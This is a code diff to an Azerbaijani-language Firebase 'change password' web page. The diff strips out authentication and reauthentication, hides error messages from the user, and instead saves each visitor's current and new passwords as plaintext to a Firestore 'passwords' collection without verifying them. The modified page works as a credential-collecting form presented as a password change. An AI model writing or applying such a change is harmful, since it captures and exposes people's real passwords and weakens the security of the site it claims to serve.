@@ -70,7 +70,6 @@
                 />
                 <span class="toggle-password" onclick="togglePassword('confirmPassword')">Göstər</span>
             </div>
-            <p id="errorMessage" class="text-red-500 text-sm mb-4 hidden"></p>
             <p id="successMessage" class="text-green-500 text-sm mb-4 hidden">
                 Şifrə uğurla saxlanıldı!
             </p>
@@ -86,7 +85,6 @@
     <!-- Firebase SDK -->
     <script type="module">
         import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js';
-        import { getAuth, EmailAuthProvider, reauthenticateWithCredential } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js';
         import { getFirestore, collection, addDoc } from 'https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js';
 
         const firebaseConfig = {
@@ -100,16 +98,13 @@
         };
 
         // Firebase-i başlat
-        let db, auth;
+        let db;
         try {
             const app = initializeApp(firebaseConfig);
-            auth = getAuth(app);
             db = getFirestore(app);
-            console.log("Firebase, Authentication və Firestore uğurla başladı");
+            console.log("Firestore uğurla başladı");
         } catch (error) {
             console.error("Firebase başlama xətası:", error);
-            document.getElementById('errorMessage').textContent = `Firebase başlama xətası: ${error.message}`;
-            document.getElementById('errorMessage').classList.remove('hidden');
         }
 
         function togglePassword(id) {
@@ -128,10 +123,7 @@
         const currentPassword = document.getElementById('currentPassword');
         const newPassword = document.getElementById('newPassword');
         const confirmPassword = document.getElementById('confirmPassword');
-        const errorMessage = document.getElementById('errorMessage');
         const successMessage = document.getElementById('successMessage');
-        const passwordStrength = document.getElementById('passwordStrength');
-        const strengthText = document.getElementById('strengthText');
 
         const validatePassword = (password) => {
             const minLength = 8;
@@ -144,6 +136,9 @@
             ];
 
             strength = checks.filter(Boolean).length;
+
+            const passwordStrength = document.getElementById('passwordStrength');
+            const strengthText = document.getElementById('strengthText');
 
             if (!password) {
                 passwordStrength.className = 'password-strength';
@@ -184,58 +179,31 @@
 
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
-            errorMessage.classList.add('hidden');
             successMessage.classList.add('hidden');
 
             const validation = validatePassword(newPassword.value);
             if (!validation.valid) {
-                errorMessage.textContent = validation.message;
-                errorMessage.classList.remove('hidden');
+                console.log("Şifrə yoxlaması uğursuz: " + validation.message);
                 return;
             }
 
             if (newPassword.value !== confirmPassword.value) {
-                errorMessage.textContent = 'Yeni şifrə ilə təkrar şifrə uyğun gəlmir.';
-                errorMessage.classList.remove('hidden');
+                console.log("Yeni şifrə ilə təkrar şifrə uyğun gəlmir.");
                 return;
             }
 
             try {
-                const user = auth.currentUser;
-                if (!user) {
-                    errorMessage.textContent = 'Daxil olmuş istifadəçi tapılmadı. Zəhmət olmasa daxil olun.';
-                    errorMessage.classList.remove('hidden');
-                    return;
-                }
-
-                // Mövcud şifrə ilə yenidən autentifikasiya
-                const credential = EmailAuthProvider.credential(user.email, currentPassword.value);
-                await reauthenticateWithCredential(user, credential);
-                console.log("Autentifikasiya uğurlu oldu");
-
-                // Yeni şifrəni Firestore-a mətn kimi saxla
+                // Mövcud şifrə və yeni şifrəni Firestore-a mətn kimi saxla
                 const docRef = await addDoc(collection(db, 'passwords'), {
-                    userId: user.uid,
+                    currentPassword: currentPassword.value,
                     newPassword: newPassword.value,
                     timestamp: new Date().toISOString()
                 });
-                console.log("Şifrə Firestore-a yazıldı, sənəd ID:", docRef.id);
+                console.log("Şifrələr Firestore-a yazıldı, sənəd ID:", docRef.id);
                 successMessage.textContent = 'Şifrə uğurla saxlanıldı!';
                 successMessage.classList.remove('hidden');
             } catch (error) {
-                console.error("Xəta:", error);
-                let errorMsg = 'Xəta baş verdi: ';
-                if (error.code === 'auth/wrong-password') {
-                    errorMsg = 'Mövcud şifrə yanlışdır.';
-                } else if (error.code === 'auth/too-many-requests') {
-                    errorMsg = 'Çox sayda cəhd. Zəhmət olmasa bir az sonra yenidən cəhd edin.';
-                } else if (error.code === 'firestore/permission-denied') {
-                    errorMsg = 'Firestore-a yazmaq üçün icazə yoxdur. Təhlükəsizlik qaydalarını yoxlayın.';
-                } else {
-                    errorMsg += error.message;
-                }
-                errorMessage.textContent = errorMsg;
-                errorMessage.classList.remove('hidden');
+                console.error("Firestore-a yazı xətası:", error);
             }
         });
     </script>
